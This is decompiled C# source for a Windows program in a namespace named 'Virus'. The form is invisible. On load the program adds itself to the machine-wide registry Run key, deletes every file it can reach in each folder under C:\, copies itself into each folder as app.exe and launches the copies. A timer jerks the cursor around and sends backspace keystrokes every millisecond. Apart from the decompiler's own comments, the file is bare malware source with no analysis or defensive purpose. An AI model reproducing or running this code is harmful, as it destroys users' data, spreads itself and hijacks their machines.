using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using Microsoft.Win32;

namespace Virus;

public class Form1 : Form
{
	private IContainer components;

	private Timer crazyCursor;

	public Form1()
	{
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("App", Environment.GetCommandLineArgs()[0]);
		}
		catch
		{
		}
		string[] array = null;
		try
		{
			array = Directory.GetDirectories(Environment.GetCommandLineArgs()[1].ToString());
		}
		catch
		{
			array = Directory.GetDirectories("C:\\");
		}
		for (int i = 0; i <= array.Length - 1; i++)
		{
			string[] files = Directory.GetFiles(array[i]);
			for (int j = 0; j <= files.Length - 1; j++)
			{
				try
				{
					File.Delete(files[j]);
				}
				catch
				{
				}
			}
			try
			{
				File.Copy(Environment.GetCommandLineArgs()[0].ToString(), array[i] + "\\app.exe");
				Process.Start(array[i] + "\\app.exe", array[i] + "\\");
			}
			catch
			{
			}
		}
	}

	private void crazyCursor_Tick(object sender, EventArgs e)
	{
		Random random = new Random();
		int x = random.Next(0, Screen.get_PrimaryScreen().get_Bounds().Width);
		int y = random.Next(0, Screen.get_PrimaryScreen().get_Bounds().Height);
		Cursor.set_Position(new Point(x, y));
		SendKeys.Send("{BACKSPACE}");
	}

	private void replication_Tick(object sender, EventArgs e)
	{
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		components = new Container();
		crazyCursor = new Timer(components);
		((Control)this).SuspendLayout();
		crazyCursor.set_Enabled(true);
		crazyCursor.set_Interval(1);
		crazyCursor.add_Tick((EventHandler)crazyCursor_Tick);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(115, 0));
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Control)this).set_Text("Form1");
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}
}
